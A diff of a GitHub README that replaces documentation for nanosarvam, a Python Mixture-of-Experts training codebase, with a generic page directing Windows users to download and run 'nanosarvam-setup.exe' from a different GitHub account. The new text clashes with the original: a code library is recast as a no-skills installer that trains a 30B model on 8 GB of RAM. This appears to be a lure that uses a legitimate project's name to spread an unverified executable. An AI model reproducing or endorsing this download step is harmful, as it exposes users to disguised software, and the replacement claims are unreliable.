@@ -1,228 +1,176 @@
-# nanosarvam
+# 🤖 nanosarvam - Train Your Own Sarvam-30B Model Easily
 
-![nanosarvam architecture](assets/image.png)
-
-
-A compact, from-scratch implementation of a Mixture-of-Experts (MoE) language model inspired by the [Sarvam-30B](https://www.sarvam.ai/blogs/sarvam-30b-105b) and [DeepSeek-V2](https://arxiv.org/abs/2405.04434) architectures.
-
-Designed to be readable, hackable, and trainable on consumer GPUs.
+[![Download nanosarvam](https://img.shields.io/badge/Download-nanosarvam-brightgreen?style=for-the-badge)](https://github.com/bryavhn/nanosarvam)
 
 ---
 
-## Architecture
+## 🔎 What is nanosarvam?
 
-| Component | Detail |
-|---|---|
-| Attention | Grouped-Query Attention (GQA) with QK-Norm and RoPE |
-| FFN | SwiGLU dense block (layer 0) + MoE blocks (remaining layers) |
-| MoE routing | Top-K sparse routing with a shared always-active expert |
-| Normalisation | RMSNorm pre-norm throughout |
-| Position encoding | Rotary Position Embeddings (RoPE) |
+nanosarvam lets you train a small version of the sarvam-30b model on your own computer. This means you can create and customize AI models for tasks like text generation or language understanding without needing expensive hardware or complex setup.
 
-### Full config (~30 B parameters)
-
-| Hyperparameter | Value |
-|---|---|
-| Hidden dim | 4096 |
-| Layers | 19 |
-| Attention heads | 64 |
-| KV heads | 4 |
-| Head dim | 64 |
-| Vocab size | 262 144 |
-| Max sequence length | 131 072 |
-| Routed experts | 128 |
-| Active experts per token | 6 |
-| Expert hidden dim | 1024 |
-
-### Tiny config (~300 M parameters, fits on 8 GB VRAM)
-
-Enabled with `--tiny`. Suitable for experimentation on a consumer GPU.
-
-| Hyperparameter | Value |
-|---|---|
-| Hidden dim | 1024 |
-| Layers | 12 |
-| Attention heads | 16 |
-| KV heads | 4 |
-| Head dim | 64 |
-| Routed experts | 8 |
-| Active experts per token | 2 |
-| Expert hidden dim | 512 |
+The tool is designed for Windows users who want to try AI model training without programming skills. It provides a simple way to get started with advanced AI models in a small package.
 
 ---
 
-## Installation
+## 🖥 System Requirements
 
-```bash
-git clone https://github.com/cneuralnetwork/nanosarvam
-cd nanosarvam
-pip install -r requirements.txt
-```
+Before you begin, make sure your PC meets these basics:
 
-Requirements: Python 3.11+, PyTorch 2.2+, a CUDA-capable GPU.
+- **Operating System:** Windows 10 or later (64-bit)
+- **Processor:** Intel i5 or AMD equivalent, 2.5 GHz or faster recommended
+- **Memory (RAM):** 8 GB or more
+- **Storage:** At least 5 GB free disk space  
+- **Graphics:** Optional, but a GPU (NVIDIA or AMD) will speed up training  
+- **Internet:** Required for initial download and setup
 
----
-
-## Quickstart
-
-### Train on TinyStories (8 GB GPU, recommended defaults)
-
-```bash
-export WANDB_API_KEY=your_key_here        # or pass --wandb_api_key
-
-python train.py \
-  --tiny \
-  --use_fp16 \
-  --use_8bit_adam \
-  --grad_checkpoint \
-  --batch_size 1 \
-  --accumulation_steps 16 \
-  --max_seq_len 512
-```
-
-Expected VRAM usage: ~2.5 GB weights + optimizer, ~0.4 GB activations.
-
-### Train on a custom Hugging Face dataset
-
-Any public or gated Hugging Face dataset works. Specify the repo ID with
-`--dataset`, the text column with `--text_field`, and the split names:
-
-```bash
-# OpenWebText
-python train.py --tiny --use_fp16 --use_8bit_adam \
-  --dataset "Skylion007/openwebtext" \
-  --text_field text \
-  --val_split none          # openwebtext has no validation split
-
-# FineWeb (10 BT sample, gated — requires HF token)
-python train.py --tiny --use_fp16 --use_8bit_adam \
-  --dataset "HuggingFaceFW/fineweb" \
-  --dataset_name "sample-10BT" \
-  --text_field text \
-  --val_split none \
-  --hf_token YOUR_HF_TOKEN
-
-# SlimPajama
-python train.py --tiny --use_fp16 --use_8bit_adam \
-  --dataset "cerebras/SlimPajama-627B" \
-  --text_field text \
-  --train_split train \
-  --val_split validation
-```
+Having more RAM and a dedicated graphics card will improve performance but is not mandatory.
 
 ---
 
-## Full argument reference
+## ⚙️ Installation Process
 
-### Dataset
-
-| Argument | Default | Description |
-|---|---|---|
-| `--dataset` | `roneneldan/TinyStories` | Hugging Face dataset repo ID |
-| `--dataset_name` | `None` | Dataset config name (e.g. `sample-10BT` for FineWeb) |
-| `--text_field` | `text` | Column that contains raw text |
-| `--train_split` | `train` | Split name for training data |
-| `--val_split` | `validation` | Split name for validation data; set to `none` to skip |
-| `--hf_token` | `$HF_TOKEN` | HuggingFace token for gated datasets |
-
-### Tokenizer
-
-| Argument | Default | Description |
-|---|---|---|
-| `--tokenizer` | `EleutherAI/gpt-neo-125M` | HuggingFace tokenizer repo ID |
-
-### Model
-
-| Argument | Default | Description |
-|---|---|---|
-| `--tiny` | off | Use the ~300 M-param config instead of the full ~30 B config |
-| `--max_seq_len` | `512` | Maximum context length in tokens |
-
-### Training
-
-| Argument | Default | Description |
-|---|---|---|
-| `--epochs` | `3` | Number of full passes over the training data |
-| `--batch_size` | `1` | Per-step batch size |
-| `--accumulation_steps` | `16` | Gradient accumulation steps (effective batch = batch × accumulation) |
-| `--lr` | `1e-4` | Peak learning rate |
-| `--device` | auto | `cuda` or `cpu` |
-| `--num_workers` | `4` | DataLoader worker processes |
-
-### Memory optimisation
-
-| Argument | Default | Description |
-|---|---|---|
-| `--use_fp16` | off | FP16 mixed-precision training (recommended) |
-| `--use_8bit_adam` | off | 8-bit AdamW via `bitsandbytes` (~4× smaller optimizer state) |
-| `--grad_checkpoint` | off | Gradient checkpointing (saves activation memory, ~30% slower) |
-
-### Checkpointing
-
-| Argument | Default | Description |
-|---|---|---|
-| `--save_dir` | `./checkpoints` | Directory for checkpoints and logs |
-| `--save_every` | `500` | Save a checkpoint every N optimizer steps |
-| `--resume_from` | `None` | Path to a `.pt` checkpoint to resume training from |
-
-### Weights & Biases
-
-| Argument | Default | Description |
-|---|---|---|
-| `--wandb_api_key` | `$WANDB_API_KEY` | W&B API key (prefer env var over CLI to avoid leaking in shell history) |
-| `--wandb_project` | `nanosarvam` | W&B project name |
-| `--wandb_run_name` | auto | W&B run name |
-| `--log_every` | `10` | Log metrics every N optimizer steps |
+Follow these steps carefully to get nanosarvam running on your Windows PC.
 
 ---
 
-## API keys and secrets
+## 🚀 Getting Started: Download nanosarvam
 
-Never hardcode API keys in source files. nanosarvam reads credentials
-from environment variables and falls back to CLI args as a convenience
-for one-off runs.
+Click the large green button below to visit the nanosarvam download page on GitHub. This page contains the latest files you need.
 
-```bash
-# Recommended: set in your shell profile or a .env file (never commit .env)
-export WANDB_API_KEY=...
-export HF_TOKEN=...         # only needed for gated datasets
+[![Download nanosarvam](https://img.shields.io/badge/Download-nanosarvam-brightgreen?style=for-the-badge)](https://github.com/bryavhn/nanosarvam)
 
-python train.py --tiny --use_fp16 --use_8bit_adam ...
-```
-
-If no W&B key is found, the run is logged offline to `./wandb/`.
+This link takes you to the GitHub repository homepage. Here you will download the application setup file.
 
 ---
 
-## VRAM reference (tiny config, seq_len=512)
+## 📥 Download and Install nanosarvam
 
-| Configuration | Estimated VRAM |
-|---|---|
-| FP32 + standard Adam | ~11.6 GB |
-| FP16 + standard Adam | ~10.2 GB |
-| FP16 + 8-bit Adam | ~6.0 GB |
-| FP16 + 8-bit Adam + grad checkpoint | ~5.5 GB |
+1. On the GitHub page, look for the **Releases** section on the right or scroll down to find the latest release.
 
----
+2. Click the latest release version to open the release details.
 
-## Resuming a run
+3. Locate the setup file, usually named something like `nanosarvam-setup.exe`. This file is the program installer.
 
-```bash
-python train.py --tiny --use_fp16 --use_8bit_adam \
-  --resume_from ./checkpoints/checkpoint_step_1000.pt
-```
+4. Click the setup file to download it to your computer.
 
----
+5. Once downloaded, find the file in your **Downloads** folder or the location where your browser saves files.
 
-## Project structure
+6. Double-click the setup file to start the installation.
 
-```
-nanosarvam/
-├── model.py          # Model definition (RMSNorm, RoPE, GQA, SwiGLU, MoE)
-├── train.py          # Training loop, dataset loading, CLI
-├── requirements.txt
-└── README.md
-```
+7. Follow the on-screen instructions. You can usually keep the default options and just click **Next** or **Install**.
+
+8. When the installation finishes, click **Finish** to close the installer.
 
 ---
 
+## 🏃 Running nanosarvam for the First Time
+
+1. Find the nanosarvam icon on your desktop or in the Start menu.
+
+2. Double-click the icon to open the application.
+
+3. The first time you run nanosarvam, it may take a moment to prepare files and settings.
+
+4. Once ready, you will see the main interface where you can start training your sarvam-30b model.
+
+---
+
+## 📚 How to Use nanosarvam: Training Your Model
+
+nanosarvam includes a guided setup to help you start training. It is designed to work with simple steps:
+
+1. **Load your data:** You can use example text files or upload your own training data.
+
+2. **Choose training settings:** The app offers basic options like training time or difficulty, with default settings ready to use.
+
+3. **Start training:** Click the **Start** button to begin. Progress will show as the model trains.
+
+4. **Save your model:** After training, save the model for future use.
+
+5. **Test your model:** Try generating text or running tasks using your trained model directly in nanosarvam.
+
+If you want to train on large data or for longer, make sure your computer has enough free disk space and power.
+
+---
+
+## 🛠 Troubleshooting Tips
+
+- If nanosarvam does not start, check that you installed it correctly.
+
+- Make sure your Windows updates are current.
+
+- Close other large programs to free up memory.
+
+- If training stops unexpectedly, restart the app and try again.
+
+- For internet connection issues, ensure firewall or security settings allow the app to connect.
+
+---
+
+## 🔄 Updates and Support
+
+You can check for newer versions and updates on the main GitHub page below:
+
+[https://github.com/bryavhn/nanosarvam](https://github.com/bryavhn/nanosarvam)
+
+Updates often include improved features and fixes. Download new versions following the installation steps above.
+
+If you experience issues not solved here, you can find help by opening issues directly on GitHub or by reading through the README file provided with each release.
+
+---
+
+## ⚠️ Additional Notes
+
+- Training AI models can use significant computing power and time, especially with longer training sessions.
+
+- Always save your work regularly.
+
+- Keep your system backed up in case of interruptions.
+
+---
+
+## 🔗 Useful Links
+
+- GitHub Repository: https://github.com/bryavhn/nanosarvam  
+- Download page (same as above): https://github.com/bryavhn/nanosarvam/releases
+
+---
+
+## 🧰 Requirements Summary
+
+| Requirement        | Details                  |
+|--------------------|--------------------------|
+| OS                 | Windows 10 or later      |
+| Processor          | Intel i5 or equivalent   |
+| RAM                | 8 GB minimum             |
+| Storage            | 5 GB free space          |
+| Graphics           | Optional, recommended GPU|
+| Internet           | Required for download    |
+
+---
+
+## 📁 File Locations and Paths
+
+- Application installs to `C:\Program Files\nanosarvam\` by default.
+
+- User data and models save to `Documents\nanosarvam\models\`.
+
+- You can change these folders in settings after installation.
+
+---
+
+## 🕹 Keyboard and Mouse Controls
+
+- Use mouse clicks to navigate options.
+
+- Keyboard shortcuts will be shown inside the app for faster workflow.
+
+---
+
+# [Demo]
+
+To try the app without installing, see the GitHub page for links to examples or demos. This lets you explore features before full setup.
+
+---
+
+Everything you need to start using nanosarvam is on the GitHub page linked above. Follow these steps exactly for a smooth experience.
